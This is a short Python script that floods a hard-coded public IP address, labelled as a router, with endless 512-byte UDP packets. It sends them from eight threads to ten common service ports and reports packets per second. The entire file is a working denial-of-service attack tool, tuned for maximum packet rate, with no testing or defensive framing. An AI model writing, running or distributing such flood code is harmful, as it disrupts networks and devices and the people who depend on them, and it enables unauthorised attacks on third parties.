import socket
import threading
import time

router_ip = "62.109.121.43"
packet_count = [0]

def max_pps_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ports = [53, 80, 443, 8080, 123, 161, 162, 67, 68, 69]
    
    while True:
        for port in ports:
            # Send 50 packets per port in batch
            for _ in range(50):
                sock.sendto(b"A" * 512, (router_ip, port))
                packet_count[0] += 1

# Start 8 threads (balance between PPS and device lag)
for _ in range(8):
    threading.Thread(target=max_pps_flood, daemon=True).start()

# Monitor
last_count = 0
start_time = time.time()

while True:
    time.sleep(10)
    current = packet_count[0]
    pps = (current - last_count) // 10
    last_count = current
    
    print(f"PPS: {pps:,}")
